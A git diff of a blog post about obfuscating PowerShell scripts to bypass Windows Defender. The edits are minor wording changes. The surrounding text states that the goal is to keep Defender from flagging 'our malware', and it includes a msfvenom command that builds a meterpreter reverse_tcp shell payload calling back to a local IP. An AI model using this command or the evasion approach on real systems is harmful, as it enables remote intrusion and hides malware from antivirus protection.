@@ -1,5 +1,5 @@
 ---
-title: Obfuscation Powershell Script Bypass Defender
+title: Obfuscation Powershell Scripting Bypass Defender
 published: true
 ---
 
@@ -18,7 +18,7 @@ There should be whitespace between paragraphs. We recommend including a README, 
 
 In software development, obfuscation is the act of creating source or machine code that is difficult for humans or computers to understand. Like obfuscation in natural language, it may use needlessly roundabout expressions to compose statements. Programmers may deliberately obfuscate code to conceal its purpose (security through obscurity) or its logic or implicit values embedded in it, primarily, in order to prevent tampering, deter reverse engineering, or even to create a puzzle or recreational challenge for someone reading the source code. This can be done manually or by using an automated tool, the latter being the preferred technique in industry
 
-# [](#header-2) Why could it Bypass Windows Defender
+# [](#header-2) Why could it Bypass Windows Defender ?
 
 Windows defender is antivirus provided by windows to avoid infection from malware and trojan. Windows Defender collects trillions of data every day. It uses these data to take advantage and learn treat pattern to understand behaviour of malware.
 The goal from obfuscation is to render the code hard to understand for the antivirus and make it upset. So Windows Defender won't able to classified the program as trojan and skip all detected potential treat for our malware.
@@ -40,7 +40,7 @@ First of all, let's create basic meterpreter in powershell.
 ```console
 msfvenom -p windows/x64/meterpreter/reverse_tcp lport=4444 lhost=192.168.1.66 -f psh -o basic_meterpreter.ps1
 ```
-Now let's check the bad score this sample malware has.
+Now let's check the bad score this sample malware has on [https://virustotal.com](https://virustotal.com)
 
 
 <img src="../assets/basic_malware.png">
